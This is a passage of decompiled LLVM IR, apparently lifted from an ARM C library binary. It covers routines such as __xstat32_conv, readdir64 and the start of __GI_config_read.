  %v2_15948 = add i32 %v1_15948, 100
  %v3_15948 = inttoptr i32 %v2_15948 to i32*
  store i32 %v0_15948, i32* %v3_15948, align 4
  %v0_1594c = load i32, i32* %r6.global-to-local, align 4
  %v1_1594c = add i32 %v0_1594c, 24
  store i32 %v1_1594c, i32* %ip.global-to-local, align 4
  %v1_15950 = inttoptr i32 %v1_1594c to i32*
  %v2_15950 = load i32, i32* %v1_15950, align 4
  store i32 %v2_15950, i32* %ip.global-to-local, align 4
  %v3_15950 = add i32 %v0_1594c, 28
  %v4_15950 = inttoptr i32 %v3_15950 to i32*
  %v5_15950 = load i32, i32* %v4_15950, align 4
  store i32 %v5_15950, i32* %lr.global-to-local, align 4
  %v0_15954 = load i32, i32* %r2.global-to-local, align 4
  %v1_15954 = load i32, i32* %r5.global-to-local, align 4
  %v2_15954 = add i32 %v1_15954, 56
  %v3_15954 = inttoptr i32 %v2_15954 to i32*
  store i32 %v0_15954, i32* %v3_15954, align 4
  %v0_15958 = load i32, i32* %r6.global-to-local, align 4
  %v1_15958 = add i32 %v0_15958, 72
  store i32 %v1_15958, i32* %r3.global-to-local, align 4
  %v1_1595c = add i32 %v0_15958, 32
  store i32 %v1_1595c, i32* %r7.global-to-local, align 4
  %v1_15960 = inttoptr i32 %v1_1595c to i32*
  %v2_15960 = load i32, i32* %v1_15960, align 4
  store i32 %v2_15960, i32* %r7.global-to-local, align 4
  %v3_15960 = add i32 %v0_15958, 36
  %v4_15960 = inttoptr i32 %v3_15960 to i32*
  %v5_15960 = load i32, i32* %v4_15960, align 4
  store i32 %v5_15960, i32* %r8.global-to-local, align 4
  %v1_15964 = inttoptr i32 %v1_15958 to i32*
  %v2_15964 = load i32, i32* %v1_15964, align 4
  %v3_15964 = add i32 %v0_15958, 76
  %v4_15964 = inttoptr i32 %v3_15964 to i32*
  %v5_15964 = load i32, i32* %v4_15964, align 4
  store i32 %v5_15964, i32* %r1.global-to-local, align 4
  %v0_15968 = load i32, i32* %r5.global-to-local, align 4
  %v1_15968 = add i32 %v0_15968, 72
  %v1_1596c = inttoptr i32 %v1_15968 to i32*
  store i32 %v2_15964, i32* %v1_1596c, align 4
  %v3_1596c = add i32 %v0_15968, 76
  %v4_1596c = inttoptr i32 %v3_1596c to i32*
  %v5_1596c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1596c, i32* %v4_1596c, align 4
  %v0_15970 = load i32, i32* %r7.global-to-local, align 4
  %v1_15970 = load i32, i32* %r5.global-to-local, align 4
  %v2_15970 = add i32 %v1_15970, 32
  %v3_15970 = inttoptr i32 %v2_15970 to i32*
  store i32 %v0_15970, i32* %v3_15970, align 4
  %v0_15974 = load i32, i32* %r8.global-to-local, align 4
  %v1_15974 = load i32, i32* %r5.global-to-local, align 4
  %v2_15974 = add i32 %v1_15974, 36
  %v3_15974 = inttoptr i32 %v2_15974 to i32*
  store i32 %v0_15974, i32* %v3_15974, align 4
  %v0_15978 = load i32, i32* %r6.global-to-local, align 4
  %v1_15978 = add i32 %v0_15978, 80
  store i32 %v1_15978, i32* %r3.global-to-local, align 4
  %v1_1597c = add i32 %v0_15978, 48
  store i32 %v1_1597c, i32* %r7.global-to-local, align 4
  %v1_15980 = inttoptr i32 %v1_1597c to i32*
  %v2_15980 = load i32, i32* %v1_15980, align 4
  store i32 %v2_15980, i32* %r7.global-to-local, align 4
  %v3_15980 = add i32 %v0_15978, 52
  %v4_15980 = inttoptr i32 %v3_15980 to i32*
  %v5_15980 = load i32, i32* %v4_15980, align 4
  store i32 %v5_15980, i32* %r8.global-to-local, align 4
  %v1_15984 = inttoptr i32 %v1_15978 to i32*
  %v2_15984 = load i32, i32* %v1_15984, align 4
  %v3_15984 = add i32 %v0_15978, 84
  %v4_15984 = inttoptr i32 %v3_15984 to i32*
  %v5_15984 = load i32, i32* %v4_15984, align 4
  store i32 %v5_15984, i32* %r1.global-to-local, align 4
  %v1_15988 = add i32 %v0_15978, 16
  %v2_15988 = inttoptr i32 %v1_15988 to i32*
  %v3_15988 = load i32, i32* %v2_15988, align 4
  store i32 %v3_15988, i32* %r2.global-to-local, align 4
  %v0_1598c = load i32, i32* %r5.global-to-local, align 4
  %v1_1598c = add i32 %v0_1598c, 80
  %v1_15990 = inttoptr i32 %v1_1598c to i32*
  store i32 %v2_15984, i32* %v1_15990, align 4
  %v3_15990 = add i32 %v0_1598c, 84
  %v4_15990 = inttoptr i32 %v3_15990 to i32*
  %v5_15990 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15990, i32* %v4_15990, align 4
  %v0_15994 = load i32, i32* %r7.global-to-local, align 4
  %v1_15994 = load i32, i32* %r5.global-to-local, align 4
  %v2_15994 = add i32 %v1_15994, 48
  %v3_15994 = inttoptr i32 %v2_15994 to i32*
  store i32 %v0_15994, i32* %v3_15994, align 4
  %v0_15998 = load i32, i32* %r8.global-to-local, align 4
  %v1_15998 = load i32, i32* %r5.global-to-local, align 4
  %v2_15998 = add i32 %v1_15998, 52
  %v3_15998 = inttoptr i32 %v2_15998 to i32*
  store i32 %v0_15998, i32* %v3_15998, align 4
  %v0_1599c = load i32, i32* %r2.global-to-local, align 4
  %v1_1599c = load i32, i32* %r5.global-to-local, align 4
  %v2_1599c = add i32 %v1_1599c, 16
  %v3_1599c = inttoptr i32 %v2_1599c to i32*
  store i32 %v0_1599c, i32* %v3_1599c, align 4
  %v0_159a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_159a0 = add i32 %v0_159a0, 88
  store i32 %v1_159a0, i32* %r3.global-to-local, align 4
  %v1_159a4 = add i32 %v0_159a0, 20
  %v2_159a4 = inttoptr i32 %v1_159a4 to i32*
  %v3_159a4 = load i32, i32* %v2_159a4, align 4
  store i32 %v3_159a4, i32* %r2.global-to-local, align 4
  %v1_159a8 = inttoptr i32 %v1_159a0 to i32*
  %v2_159a8 = load i32, i32* %v1_159a8, align 4
  %v3_159a8 = add i32 %v0_159a0, 92
  %v4_159a8 = inttoptr i32 %v3_159a8 to i32*
  %v5_159a8 = load i32, i32* %v4_159a8, align 4
  store i32 %v5_159a8, i32* %r1.global-to-local, align 4
  %v1_159ac = add i32 %v0_159a0, 64
  store i32 %v1_159ac, i32* %r6.global-to-local, align 4
  %v1_159b0 = inttoptr i32 %v1_159ac to i32*
  %v2_159b0 = load i32, i32* %v1_159b0, align 4
  store i32 %v2_159b0, i32* %r6.global-to-local, align 4
  %v3_159b0 = add i32 %v0_159a0, 68
  %v4_159b0 = inttoptr i32 %v3_159b0 to i32*
  %v5_159b0 = load i32, i32* %v4_159b0, align 4
  store i32 %v5_159b0, i32* %r7.global-to-local, align 4
  %v0_159b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_159b4 = add i32 %v0_159b4, 88
  store i32 %v1_159b4, i32* %r3.global-to-local, align 4
  %v2_159b8 = add i32 %v0_159b4, 20
  %v3_159b8 = inttoptr i32 %v2_159b8 to i32*
  store i32 %v3_159a4, i32* %v3_159b8, align 4
  %v0_159bc = load i32, i32* %ip.global-to-local, align 4
  %v1_159bc = load i32, i32* %r5.global-to-local, align 4
  %v2_159bc = add i32 %v1_159bc, 24
  %v3_159bc = inttoptr i32 %v2_159bc to i32*
  store i32 %v0_159bc, i32* %v3_159bc, align 4
  %v0_159c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_159c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c0 = add i32 %v1_159c0, 28
  %v3_159c0 = inttoptr i32 %v2_159c0 to i32*
  store i32 %v0_159c0, i32* %v3_159c0, align 4
  %v0_159c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_159c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c4 = add i32 %v1_159c4, 64
  %v3_159c4 = inttoptr i32 %v2_159c4 to i32*
  store i32 %v0_159c4, i32* %v3_159c4, align 4
  %v0_159c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_159c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_159c8 = add i32 %v1_159c8, 68
  %v3_159c8 = inttoptr i32 %v2_159c8 to i32*
  store i32 %v0_159c8, i32* %v3_159c8, align 4
  %v0_159cc = load i32, i32* %r3.global-to-local, align 4
  %v1_159cc = inttoptr i32 %v0_159cc to i32*
  store i32 %v2_159a8, i32* %v1_159cc, align 4
  %v3_159cc = add i32 %v0_159cc, 4
  %v4_159cc = inttoptr i32 %v3_159cc to i32*
  %v5_159cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_159cc, i32* %v4_159cc, align 4
  %v2_159d0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_159d0, i32* %r4.global-to-local, align 4
  ret i32 %v2_159a8

; uselistorder directives
  uselistorder i32 %v0_159a0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15978, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_159d8 = load i32, i32* @r4, align 4
  store i32 %v3_159d8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_159f0 = inttoptr i32 %arg2 to i8*
  %v4_159f0 = call i32 @__GI_memset(i8* %v3_159f0, i32 0, i32 88)
  %v2_159f4 = load i32, i32* %arg1, align 4
  %v3_159f4 = add i32 %tmp, 4
  %v4_159f4 = inttoptr i32 %v3_159f4 to i32*
  %v5_159f4 = load i32, i32* %v4_159f4, align 4
  store i32 %v5_159f4, i32* %r4.global-to-local, align 4
  %v0_159f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_159f8 = inttoptr i32 %v0_159f8 to i32*
  store i32 %v2_159f4, i32* %v1_159f8, align 4
  %v3_159f8 = add i32 %v0_159f8, 4
  %v4_159f8 = inttoptr i32 %v3_159f8 to i32*
  %v5_159f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_159f8, i32* %v4_159f8, align 4
  %v0_159fc = load i32, i32* %r5.global-to-local, align 4
  %v1_159fc = add i32 %v0_159fc, 32
  %v1_15a00 = inttoptr i32 %v1_159fc to i32*
  %v2_15a00 = load i32, i32* %v1_15a00, align 4
  %v3_15a00 = add i32 %v0_159fc, 36
  %v4_15a00 = inttoptr i32 %v3_15a00 to i32*
  %v5_15a00 = load i32, i32* %v4_15a00, align 4
  store i32 %v5_15a00, i32* %r4.global-to-local, align 4
  %v1_15a04 = add i32 %v0_159fc, 96
  %v2_15a04 = inttoptr i32 %v1_15a04 to i32*
  %v3_15a04 = load i32, i32* %v2_15a04, align 4
  store i32 %v3_15a04, i32* %r2.global-to-local, align 4
  %v1_15a08 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a08 = add i32 %v1_15a08, 32
  %v3_15a08 = inttoptr i32 %v2_15a08 to i32*
  store i32 %v2_15a00, i32* %v3_15a08, align 4
  %v0_15a0c = load i32, i32* %r4.global-to-local, align 4
  %v1_15a0c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a0c = add i32 %v1_15a0c, 36
  %v3_15a0c = inttoptr i32 %v2_15a0c to i32*
  store i32 %v0_15a0c, i32* %v3_15a0c, align 4
  %v0_15a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a10 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a10 = add i32 %v1_15a10, 12
  %v3_15a10 = inttoptr i32 %v2_15a10 to i32*
  store i32 %v0_15a10, i32* %v3_15a10, align 4
  %v0_15a14 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a14 = add i32 %v0_15a14, 48
  %v2_15a14 = inttoptr i32 %v1_15a14 to i32*
  %v3_15a14 = load i32, i32* %v2_15a14, align 4
  %v1_15a18 = add i32 %v0_15a14, 24
  store i32 %v1_15a18, i32* %ip.global-to-local, align 4
  %v1_15a1c = inttoptr i32 %v1_15a18 to i32*
  %v2_15a1c = load i32, i32* %v1_15a1c, align 4
  store i32 %v2_15a1c, i32* %ip.global-to-local, align 4
  %v3_15a1c = add i32 %v0_15a14, 28
  %v4_15a1c = inttoptr i32 %v3_15a1c to i32*
  %v5_15a1c = load i32, i32* %v4_15a1c, align 4
  store i32 %v5_15a1c, i32* %lr.global-to-local, align 4
  %v1_15a20 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a20 = add i32 %v1_15a20, 44
  %v3_15a20 = inttoptr i32 %v2_15a20 to i32*
  store i32 %v3_15a14, i32* %v3_15a20, align 4
  %v0_15a24 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a24 = add i32 %v0_15a24, 64
  %v2_15a24 = inttoptr i32 %v1_15a24 to i32*
  %v3_15a24 = load i32, i32* %v2_15a24, align 4
  %v1_15a28 = add i32 %v0_15a24, 56
  %v2_15a28 = inttoptr i32 %v1_15a28 to i32*
  %v3_15a28 = load i32, i32* %v2_15a28, align 4
  store i32 %v3_15a28, i32* %r2.global-to-local, align 4
  %v1_15a2c = load i32, i32* %r6.global-to-local, align 4
  %v2_15a2c = add i32 %v1_15a2c, 52
  %v3_15a2c = inttoptr i32 %v2_15a2c to i32*
  store i32 %v3_15a24, i32* %v3_15a2c, align 4
  %v0_15a30 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a30 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a30 = add i32 %v1_15a30, 48
  %v3_15a30 = inttoptr i32 %v2_15a30 to i32*
  store i32 %v0_15a30, i32* %v3_15a30, align 4
  %v0_15a34 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a34 = add i32 %v0_15a34, 72
  %v1_15a38 = inttoptr i32 %v1_15a34 to i32*
  %v2_15a38 = load i32, i32* %v1_15a38, align 4
  %v3_15a38 = add i32 %v0_15a34, 76
  %v4_15a38 = inttoptr i32 %v3_15a38 to i32*
  %v5_15a38 = load i32, i32* %v4_15a38, align 4
  store i32 %v5_15a38, i32* %r1.global-to-local, align 4
  %v0_15a3c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a3c = add i32 %v0_15a3c, 56
  %v1_15a40 = inttoptr i32 %v1_15a3c to i32*
  store i32 %v2_15a38, i32* %v1_15a40, align 4
  %v3_15a40 = add i32 %v0_15a3c, 60
  %v4_15a40 = inttoptr i32 %v3_15a40 to i32*
  %v5_15a40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a40, i32* %v4_15a40, align 4
  %v0_15a44 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a44 = add i32 %v0_15a44, 80
  %v1_15a48 = inttoptr i32 %v1_15a44 to i32*
  %v2_15a48 = load i32, i32* %v1_15a48, align 4
  %v3_15a48 = add i32 %v0_15a44, 84
  %v4_15a48 = inttoptr i32 %v3_15a48 to i32*
  %v5_15a48 = load i32, i32* %v4_15a48, align 4
  store i32 %v5_15a48, i32* %r1.global-to-local, align 4
  %v0_15a4c = load i32, i32* %r6.global-to-local, align 4
  %v1_15a4c = add i32 %v0_15a4c, 64
  %v1_15a50 = inttoptr i32 %v1_15a4c to i32*
  store i32 %v2_15a48, i32* %v1_15a50, align 4
  %v3_15a50 = add i32 %v0_15a4c, 68
  %v4_15a50 = inttoptr i32 %v3_15a50 to i32*
  %v5_15a50 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a50, i32* %v4_15a50, align 4
  %v0_15a54 = load i32, i32* %r5.global-to-local, align 4
  %v1_15a54 = add i32 %v0_15a54, 16
  %v2_15a54 = inttoptr i32 %v1_15a54 to i32*
  %v3_15a54 = load i32, i32* %v2_15a54, align 4
  %v1_15a58 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a58 = add i32 %v1_15a58, 16
  %v3_15a58 = inttoptr i32 %v2_15a58 to i32*
  store i32 %v3_15a54, i32* %v3_15a58, align 4
  %v0_15a5c = load i32, i32* %r5.global-to-local, align 4
  %v1_15a5c = add i32 %v0_15a5c, 88
  %v1_15a60 = add i32 %v0_15a5c, 20
  %v2_15a60 = inttoptr i32 %v1_15a60 to i32*
  %v3_15a60 = load i32, i32* %v2_15a60, align 4
  store i32 %v3_15a60, i32* %r2.global-to-local, align 4
  %v1_15a64 = inttoptr i32 %v1_15a5c to i32*
  %v2_15a64 = load i32, i32* %v1_15a64, align 4
  %v3_15a64 = add i32 %v0_15a5c, 92
  %v4_15a64 = inttoptr i32 %v3_15a64 to i32*
  %v5_15a64 = load i32, i32* %v4_15a64, align 4
  store i32 %v5_15a64, i32* %r1.global-to-local, align 4
  %v0_15a68 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a68 = add i32 %v0_15a68, 72
  %v1_15a6c = inttoptr i32 %v1_15a68 to i32*
  store i32 %v2_15a64, i32* %v1_15a6c, align 4
  %v3_15a6c = add i32 %v0_15a68, 76
  %v4_15a6c = inttoptr i32 %v3_15a6c to i32*
  %v5_15a6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15a6c, i32* %v4_15a6c, align 4
  %v0_15a70 = load i32, i32* %r2.global-to-local, align 4
  %v1_15a70 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a70 = add i32 %v1_15a70, 20
  %v3_15a70 = inttoptr i32 %v2_15a70 to i32*
  store i32 %v0_15a70, i32* %v3_15a70, align 4
  %v0_15a74 = load i32, i32* %ip.global-to-local, align 4
  %v1_15a74 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a74 = add i32 %v1_15a74, 24
  %v3_15a74 = inttoptr i32 %v2_15a74 to i32*
  store i32 %v0_15a74, i32* %v3_15a74, align 4
  %v0_15a78 = load i32, i32* %lr.global-to-local, align 4
  %v1_15a78 = load i32, i32* %r6.global-to-local, align 4
  %v2_15a78 = add i32 %v1_15a78, 28
  %v3_15a78 = inttoptr i32 %v2_15a78 to i32*
  store i32 %v0_15a78, i32* %v3_15a78, align 4
  %v2_15a7c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15a7c, i32* %r4.global-to-local, align 4
  ret i32 %v2_15a64

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r6, align 4
  %v1_15a98 = add i32 %tmp, 24
  store i32 %v1_15a98, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_15ab0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), align 4
  store i32 %v4_15ab0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15ab0)
  %v0_15ac4 = load i32, i32* @r6, align 4
  %v2_15ac4 = add i32 %v0_15ac4, 16
  %v3_15ac4 = inttoptr i32 %v2_15ac4 to i32*
  %v4_15ac4 = load i32, i32* %v3_15ac4, align 4
  store i32 %v4_15ac4, i32* %ip.global-to-local, align 4
  store i32 88784, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15ac4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_15ad4

dec_label_pc_15ad4:                               ; preds = %dec_label_pc_15b04, %entry
  %v0_15ad4 = load i32, i32* @r5, align 4
  %v1_15ad4 = add i32 %v0_15ad4, 4
  %v2_15ad4 = inttoptr i32 %v1_15ad4 to i32*
  %v3_15ad4 = load i32, i32* %v2_15ad4, align 4
  %v4_15ad4 = add i32 %v0_15ad4, 8
  %v5_15ad4 = inttoptr i32 %v4_15ad4 to i32*
  %v6_15ad4 = load i32, i32* %v5_15ad4, align 4
  %tmp10 = icmp ugt i32 %v6_15ad4, %v3_15ad4
  br i1 %tmp10, label %dec_label_pc_15b04, label %dec_label_pc_15ae0

dec_label_pc_15ae0:                               ; preds = %dec_label_pc_15ad4
  %v1_15ae0 = inttoptr i32 %v0_15ad4 to i32*
  %v2_15ae0 = load i32, i32* %v1_15ae0, align 4
  %v1_15ae4 = add i32 %v0_15ad4, 12
  %v2_15ae4 = inttoptr i32 %v1_15ae4 to i32*
  %v3_15ae4 = load i32, i32* %v2_15ae4, align 4
  %v1_15ae8 = add i32 %v0_15ad4, 20
  %v2_15ae8 = inttoptr i32 %v1_15ae8 to i32*
  %v3_15ae8 = load i32, i32* %v2_15ae8, align 4
  %v4_15aec = inttoptr i32 %v3_15ae4 to i32*
  %v5_15aec = call i32 @__getdents64(i32 %v2_15ae0, i32* %v4_15aec, i32 %v3_15ae8, i32 %v6_15ad4)
  %tmp9 = icmp slt i32 %v5_15aec, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_15afc

.thread:                                          ; preds = %dec_label_pc_15ae0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_15b34

dec_label_pc_15afc:                               ; preds = %dec_label_pc_15ae0
  %v1_15afc = load i32, i32* @r5, align 4
  %v2_15afc = add i32 %v1_15afc, 8
  %v3_15afc = inttoptr i32 %v2_15afc to i32*
  store i32 %v5_15aec, i32* %v3_15afc, align 4
  %v0_15b00 = load i32, i32* @r7, align 4
  %v1_15b00 = load i32, i32* @r5, align 4
  %v2_15b00 = add i32 %v1_15b00, 4
  %v3_15b00 = inttoptr i32 %v2_15b00 to i32*
  store i32 %v0_15b00, i32* %v3_15b00, align 4
  %v0_15b04.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15b04

dec_label_pc_15b04:                               ; preds = %dec_label_pc_15ad4, %dec_label_pc_15afc
  %v1_15b28 = phi i32 [ %v0_15ad4, %dec_label_pc_15ad4 ], [ %v0_15b04.pre, %dec_label_pc_15afc ]
  %v1_15b04 = add i32 %v1_15b28, 4
  %v2_15b04 = inttoptr i32 %v1_15b04 to i32*
  %v3_15b04 = load i32, i32* %v2_15b04, align 4
  %v1_15b08 = add i32 %v1_15b28, 12
  %v2_15b08 = inttoptr i32 %v1_15b08 to i32*
  %v3_15b08 = load i32, i32* %v2_15b08, align 4
  %v2_15b0c = add i32 %v3_15b08, %v3_15b04
  store i32 %v2_15b0c, i32* @r4, align 4
  %v3_15b10 = inttoptr i32 %v2_15b0c to i32*
  %v4_15b10 = load i32, i32* %v3_15b10, align 4
  %v1_15b14 = add i32 %v2_15b0c, 4
  %v2_15b14 = inttoptr i32 %v1_15b14 to i32*
  %v3_15b14 = load i32, i32* %v2_15b14, align 4
  %v1_15b18 = add i32 %v2_15b0c, 16
  %v2_15b18 = inttoptr i32 %v1_15b18 to i16*
  %v3_15b18 = load i16, i16* %v2_15b18, align 2
  %v4_15b18 = zext i16 %v3_15b18 to i32
  %v1_15b1c = add i32 %v2_15b0c, 8
  %v2_15b1c = inttoptr i32 %v1_15b1c to i32*
  %v3_15b1c = load i32, i32* %v2_15b1c, align 4
  store i32 %v3_15b1c, i32* %ip.global-to-local, align 4
  %v2_15b20 = add i32 %v4_15b18, %v3_15b04
  %v2_15b24 = or i32 %v3_15b14, %v4_15b10
  %v4_15b24 = icmp eq i32 %v2_15b24, 0
  store i32 %v2_15b20, i32* %v2_15b04, align 4
  %v0_15b2c = load i32, i32* %ip.global-to-local, align 4
  %v1_15b2c = load i32, i32* @r5, align 4
  %v2_15b2c = add i32 %v1_15b2c, 16
  %v3_15b2c = inttoptr i32 %v2_15b2c to i32*
  store i32 %v0_15b2c, i32* %v3_15b2c, align 4
  br i1 %v4_15b24, label %dec_label_pc_15ad4, label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b04, %.thread
  %v0_15b40 = load i32, i32* @r6, align 4
  %v2_15b40 = add i32 %v0_15b40, 44
  %v3_15b40 = inttoptr i32 %v2_15b40 to i32*
  %v4_15b40 = load i32, i32* %v3_15b40, align 4
  store i32 %v4_15b40, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15b40)
  %v0_15b4c = load i32, i32* @r4, align 4
  ret i32 %v0_15b4c

; uselistorder directives
  uselistorder i32 %v2_15b0c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_15b28, { 1, 0 }
  uselistorder i32 %v6_15ad4, { 1, 0 }
  uselistorder i32 %v0_15ad4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_15b04, { 1, 0 }
}

define i32 @function_15b60(i32 %arg1) local_unnamed_addr {
dec_label_pc_15b60:
  %v0_15b60 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15b60, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15b60
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15b60, %bb
  %v4_15b6c = phi i32 [ %arg1, %dec_label_pc_15b60 ], [ 0, %bb ]
  ret i32 %v4_15b6c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15b70 = load i32, i32* @r4, align 4
  %v6_15b70 = load i32, i32* @r5, align 4
  %v9_15b70 = load i32, i32* @r6, align 4
  %v12_15b70 = load i32, i32* @r7, align 4
  %v15_15b70 = load i32, i32* @r8, align 4
  %v18_15b70 = load i32, i32* @sb, align 4
  %v21_15b70 = load i32, i32* @sl, align 4
  %v24_15b70 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_15b74 = icmp eq i32* %arg1, null
  store i1 %v2_15b74, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_15b74, label %dec_label_pc_15e84, label %dec_label_pc_15b8c

dec_label_pc_15b8c:                               ; preds = %entry
  %v1_15b8c = urem i32 %arg3, 256
  store i32 %v1_15b8c, i32* @sb, align 4
  %v1_15b90 = and i32 %arg3, ptrtoint (i32* @global_var_ff00.33 to i32)
  %v3_15b94 = udiv i32 %v1_15b90, 256
  %v3_15b98 = mul nuw nsw i32 %v1_15b8c, 4
  %v1_15ba0 = or i32 %v3_15b98, 1
  %v1_15bac = and i32 %arg3, 131072
  %v1_15bb0 = add nsw i32 %v1_15b8c, -1
  %v1_15bbc = and i32 %arg3, 262144
  store i32 %v1_15bbc, i32* %r2.global-to-local, align 4
  %v1_15bc0 = and i32 %arg3, 65536
  store i32 %v1_15bc0, i32* %r3.global-to-local, align 4
  store i32 %v1_15bc0, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_15bd0 = add i32 %arg4, 1
  store i32 %v1_15bd0, i32* @sl, align 4
  %v2_15d48 = icmp eq i32 %v1_15bac, 0
  %v1_15da0 = inttoptr i32 %arg2 to i32*
  %v2_15db8 = icmp eq i32 %v1_15bbc, 0
  br label %dec_label_pc_15bd4

dec_label_pc_15bd4:                               ; preds = %dec_label_pc_15bd4.backedge, %dec_label_pc_15b8c
  %v2_15bf0 = phi i32 [ %v0_15bd4.pre, %dec_label_pc_15bd4.backedge ], [ %tmp, %dec_label_pc_15b8c ]
  %v1_15bd4 = add i32 %v2_15bf0, 4
  %v2_15bd4 = inttoptr i32 %v1_15bd4 to i32*
  %v3_15bd4 = load i32, i32* %v2_15bd4, align 4
  store i32 %v3_15bd4, i32* %r3.global-to-local, align 4
  %v2_15bd8 = icmp eq i32 %v3_15bd4, 0
  store i1 %v2_15bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bd8, label %dec_label_pc_15be0, label %dec_label_pc_15c28

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15bd4
  %v1_15be0 = add i32 %v2_15bf0, 16
  %v2_15be0 = inttoptr i32 %v1_15be0 to i32*
  %v3_15be0 = load i32, i32* %v2_15be0, align 4
  store i32 %v3_15be0, i32* %r3.global-to-local, align 4
  %v2_15be4 = icmp eq i32 %v3_15be0, 0
  store i1 %v2_15be4, i1* %cpsr_z.global-to-local, align 1
  %v1_15be8 = add i32 %v2_15bf0, 8
  %v2_15be8 = inttoptr i32 %v1_15be8 to i32*
  %v3_15be8 = load i32, i32* %v2_15be8, align 4
  store i32 %v3_15be8, i32* %r3.global-to-local, align 4
